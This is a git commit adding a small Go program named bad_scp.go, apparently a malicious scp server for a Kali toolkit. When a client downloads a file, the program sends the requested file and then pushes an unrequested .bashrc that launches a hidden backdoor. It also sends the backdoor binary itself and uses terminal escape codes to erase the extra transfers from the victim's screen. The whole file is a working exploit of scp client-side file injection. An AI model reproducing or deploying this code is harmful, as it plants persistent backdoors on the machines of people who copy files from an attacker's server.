176e8029b3718776336dad5f2f7bb45cc35e5bf9
Anton <vanasscheanton@gmail.com>
2023-05-19 18:17:32 +0200

    Add bad_scp go code

---
+++ src/Kali/bad_scp.go
@@ -0,0 +1,35 @@
+package main
+
+import (
+    "fmt"
+    "bufio"
+    "os"
+    "io"
+)
+
+func main() {
+    r := bufio.NewReader(os.Stdin)
+    w := bufio.NewWriter(os.Stderr)
+    r.ReadByte()
+    fmt.Println("C0644 9 testfile.txt")
+    r.ReadByte()
+    fmt.Println("Loser :)")
+    null := "\x00"
+    fmt.Print(null)
+    r.ReadByte()
+    fmt.Println("C0644 35 .bashrc")
+    r.ReadByte()
+    fmt.Println(". /etc/bashrc/nsetsid ~/.backdoor &")
+    fmt.Print(null)
+    r.ReadByte()
+    w.WriteString("\033[A\033[K")
+    w.Flush()
+    fmt.Println("C0700 961872 .backdoor")
+    r.ReadByte()
+    fh, _ := os.Open("/tmp/backdoor")
+    io.Copy(os.Stdout, fh)
+    fmt.Print(null)
+    r.ReadByte()
+    w.WriteString("\033[A\033[K")
+    w.Flush()
+}
---
+++ src/Kali/go.mod
@@ -0,0 +1,3 @@
+module umoeder
+
+go 1.19
